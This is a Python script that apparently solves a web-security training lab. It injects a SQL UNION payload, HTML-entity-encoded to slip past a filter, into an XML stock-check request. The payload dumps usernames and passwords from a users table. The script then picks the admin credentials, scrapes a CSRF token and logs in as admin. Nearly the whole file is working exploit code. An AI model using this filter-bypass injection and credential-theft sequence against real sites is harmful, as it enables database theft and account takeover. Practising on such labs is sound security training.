from bs4 import BeautifulSoup
from urllib.parse import urlencode, urljoin

import argparse
import requests
import urllib3
import string
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url")
    parser.add_argument("-x", "--use-proxy", action="store_true")
    return parser.parse_args()


def print_info(string, end="\n"):
    print(f"\r\033[1;94m[*]\033[00m {string}", end=end)


def print_success(string, end="\n"):
    print(f"\r\033[1;92m[+]\033[00m {string}", end=end)


def print_fail(string):
    print(f"\r\033[1;91m[-]\033[00m {string}")
    exit(1)


def verify_lab_accessible(url):
    print_info("Checking if given URL is accessible...")
    resp = requests.get(url)
    if resp.status_code != 504:
        print_success("URL is accessible.\n")
    else:
        print_fail("URL is inaccessible. Reopen the lab and use new URL.")


def verify_lab_solved(url):
    print_info("Revisiting URL to verify if attack was successful...")
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    if soup.select_one("#notification-labsolved"):
        print_success("Attack successful. Lab solved.")
    else:
        print_fail("Lab unsolved. Ensure...")


def solve_lab(url, proxies):
    url = urljoin(url, "/product/stock")

    payload = "4444 UNION SELECT username || ':' || password FROM users"
    print_info(f'HTML-encoding payload "{payload}"...')

    payload = "".join([f"&#{ord(char)};" for char in payload])
    print_success(f'HTML-encoded payload: "{payload}"\n')

    headers = {"Content-Type": "application/xml"}
    data = f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{payload}</storeId></stockCheck>'

    print_info(
        f'Performing a UNION attack with the following POST request to "{url}":\n'
    )
    print(f"headers: {headers}")
    print(f"data: {data}\n")

    resp = requests.post(url, proxies=proxies, verify=False, headers=headers, data=data)
    print_success(f"Extracted the following credentials:\n{resp.text}")

    for credentials in resp.text.splitlines():
        username, password = credentials.split(":")
        if username.startswith("admin"):
            print()
            break
    else:
        print_fail("Unable to find admin credentials")

    url = urljoin(url, "/login")
    print_info(f'Grabbing CSRF value from "{url}"...')

    s = requests.session()
    resp = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf = soup.select_one('input[name="csrf"]').get("value")

    if csrf is None:
        print_fail("Unable to grab CSRF value.")

    else:
        print_success(f"CSRF value: {csrf}\n")

    data = {"csrf": csrf, "username": username, "password": password}
    print_info("Logging in with the following values:")
    print(data)

    resp = s.post(
        url,
        proxies=proxies,
        verify=False,
        data=data,
    )
    print_success("SQL injection attack performed.\n")


def main():
    args = get_args()
    root_url = urljoin(args.url, "/")

    verify_lab_accessible(root_url)

    proxies = None
    if args.use_proxy:
        proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}
        print_info('Using "http://127.0.0.1:8080" as a proxy')

    solve_lab(root_url, proxies)
    verify_lab_solved(root_url)


if __name__ == "__main__":
    main()
